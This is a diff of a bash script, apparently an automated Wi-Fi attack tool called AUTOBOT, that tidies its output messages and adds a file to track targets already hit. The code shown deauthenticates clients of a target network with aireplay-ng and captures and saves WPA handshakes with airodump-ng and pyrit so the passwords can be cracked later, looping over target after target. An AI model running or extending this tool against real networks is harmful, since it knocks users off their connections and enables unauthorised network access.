@@ -57,7 +57,6 @@ fautobot()																#Automagically find active clients and collect new han
 			$COLOR 4;$COLOR2 1; echo " [*] TARGET $ESSID LOADED [*] ";$COLOR 9;$COLOR2 9
 			echo
 			$COLOR 2;$COLOR2 1; echo " [*] DEAUTHING $CLIE ";$COLOR 9;$COLOR2 9
-			echo
 			$COLOR 1;aireplay-ng -0 2 -a $BSSID -c $CLIE mon0;$COLOR 9
 			echo
 			sleep 3
@@ -72,20 +71,17 @@ fautobot()																#Automagically find active clients and collect new han
 					fautobot
 			fi
 		done
-	$COLOR 2;echo " [*] Handshake capture successful! "; $COLOR 9
 	killall airodump-ng
 	clear
 	echo "$BSSID" >> $HOME/Desktop/cap/handshakes/got
-	$COLOR 4;echo " [*] Saving and stripping handshake, please wait... [*] ";$COLOR 9
 	DATE=$( date +%Y_%m_%d_%H%M%S )
 	pyrit -r $HOME/tmp1-01.cap -o $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap" strip | grep 'New pcap-file'
 	rm -rf $HOME/tmp*
 	clear
 	$COLOR 2;$COLOR2 1;echo " [*] Handshake capture was successful!, Horray for AUTOBOT! ";$COLOR 9;$COLOR2 9
-	echo
 	$COLOR 4;echo $DONE;$COLOR 9
-	echo
 	$COLOR 2;echo " [*] Handshake saved to $HOME/Desktop/cap/handshakes/$ESSID-$DATE".cap "";$COLOR 9
+	echo
 	$COLOR 2;$COLOR2 1;echo " [>] AUTOBOT WILL RESUME IN 3 SECONDS [<] ";$COLOR 9;$COLOR2 9
 	sleep 3
 	fautobot
@@ -333,6 +329,7 @@ fstart()																#Startup
 	MOND=$(ifconfig | grep mon0)
 	mkdir -p $HOME/Desktop/cap
 	mkdir -p $HOME/Desktop/cap/handshakes
+	touch $HOME/Desktop/cap/handshakes/got
 
 	if [ $MOND -z ] 2> /dev/null
 		then
